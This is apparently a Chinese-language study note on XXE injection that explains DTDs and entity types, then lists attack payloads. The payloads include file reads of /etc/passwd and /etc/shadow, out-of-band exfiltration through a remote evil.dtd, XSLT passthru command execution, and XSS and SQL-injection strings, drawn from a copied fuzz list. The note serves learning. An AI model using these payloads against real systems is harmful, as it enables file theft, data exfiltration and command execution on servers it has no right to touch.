---
title: xxe
date: 2021-12-24 21:46:28
tags:
      - xxe
categories: web基础
typora-root-url: ..
description: xxe
---

## xxe

xxe全程XML External Entity Injection即xml外部实体注入漏洞,XXE漏洞发生在**应用程序解析XML输入时,没有禁止外部实体的加载**,导致可能加载恶意外部文件,造成文件读取,命令执行,内网探测...

#### DTD

Document Type Definition 文档类型定义

##### DTD示例

`<!ELEMENT 元素名 类型>`

文件名xxe.dtd

ELEMENT大概作用是定义标签元素的类型

```dtd
<!ELEMENT 班级 (学生+)>
<!ELEMENT 学生 (名字,年龄,介绍)>
<!ELEMENT 名字 (#PCDATA)>
<!ELEMENT 年龄 (#PCDATA)>
<!ELEMENT 介绍 (#PCDATA)>
```

##### PCDATA

PCDATA 的意思是被解析的字符数据（parsed character data）。
PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。

##### CDATA

CDATA 的意思是字符数据（character data）。
CDATA 是不会被解析器解析的文本。

##### XML示例

班级为根元素

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE 班级 SYSTEM "xxe.dtd">
<班级>
	<学生>
        <名字>张三</名字>
        <年龄>19</年龄>
        <介绍>好孩子</介绍>
    </学生>
    <学生>
        <名字>小明</名字>
        <年龄>21</年龄>
        <介绍>学习认真</介绍>
    </学生>
</班级>
```

内部DTD

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE 班级 [
<!ELEMENT 班级 (学生+)>
<!ELEMENT 学生 (名字,年龄,介绍)>
<!ELEMENT 名字 (#PCDATA)>
<!ELEMENT 年龄 (#PCDATA)>
<!ELEMENT 介绍 (#PCDATA)>
]>
<班级>
	<学生>
        <名字>张三</名字>
        <年龄>19</年龄>
        <介绍>好孩子</介绍>
    </学生>
    <学生>
        <名字>小明</名字>
        <年龄>21</年龄>
        <介绍>学习认真</介绍>
    </学生>
</班级>
```



#### 具体操作

##### 内部实体

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE neo[
	<!ELEMENT neo ANY>
	<!ENTITY xxe "hello">
]>
<neo>&xxe;</neo>
```

会在页面回显hello

##### 外部实体

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE neo[
	<!ELEMENT neo ANY>
	<!ENTITY xxe SYSTEM "文档URL">
]>
<neo>&xxe;</neo>
```

##### 参数实体

参数实体只能在DTD文档中定义,DTD中引用

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE neo[
	<!ELEMENT neo ANY>
	<!ENTITY % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd">
	%xxe;

]>
<neo>&evil;</neo>
```

#### 攻击方式

##### 直接通过DTD外部实体声明

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE neo[
	<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<c>&xxe;</c>
```

##### 通过DTD文档引入外部DTD文档,再引入外部实体声明

xml内容

```xml
<?xml version="1.0"?>
<!DOCTYPE neo SYSTEM "dtd文档url">
<c>&xxe;</c>
```

dtd内容

```dtd
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

##### 通过参数实体(OOB)

先写一个外部实体声明,然后引用在攻击者服务器上面的外部实体声明

xml内容

##### %作用

就我的理解,百分号可以类比于一段命令,它可以在dtd中被定义和执行,它在实例中相当于变量,在xml中相当于命令?

```xml
<?xml version="1.0"?>
<!DOCTYPE a [
	<!ENTITY %d SYSTEM "http://xxx.xxx/evil.dtd">
	%d;
]>
<c>&b;</c>
```

dtd文件内容

```dtd
<!ENTITY b SYSTEM "file:///etc/passwd">
```

#### 协议支持

![image-20220108211411539](https://gitee.com/blue_satchel/images/raw/master/image-20220108211411539.png)

##### XInclude(命名空间)

导入外部xml文档，类似于php的include，将外部定义的dtd引入当前文件，因为引入外部实体具有局限性，所以使用xinclude来引入

 本质是使用`http://www.w3.org/2003/XInclude` 命名空间中的两个元素，即 include 和 fallback。常用的命名空间前缀是“xi”（但可以根据喜好自由使用任何前缀）

首先使用xmls来定义命名空间为xi

然后接下来就可以使用定义好的xi命名空间中的include来包含文件了,parse可以将文件属性进行转换,转换成text进行包含输出

一个例子

```xml
<foo xmlns:xi="http://www.we.org/2003/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>//    单标签别忘了反斜杠
</foo>
```

##### SVG(矢量图)

使用Apache中的Batik库解析矢量图,可以解析xml文档

![image-20220109171338198](https://gitee.com/blue_satchel/images/raw/master/image-20220109171338198.png)

##### 对大佬写的xxe fuzz的阅读理解

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
<?xml version="1.0" encoding="ISO-8859-1"?><test></test>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com:80" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example:443" >]>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
<test></test>
<![CDATA[<test></test>]]>
&foo;
%foo;
count(/child::node())
x' or name()='username' or 'x'='y
<name>','')); phpinfo(); exit;/*</name>
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
<foo><![CDATA[' or 1=1 or ''=']]></foo>
<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<xml SRC="xsstest.xml" ID=I></xml>
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><script>alert(123)</script></xsl:template></xsl:stylesheet>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/text.txt" >]>
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  "> %int;
<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///c:/boot.ini"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
```

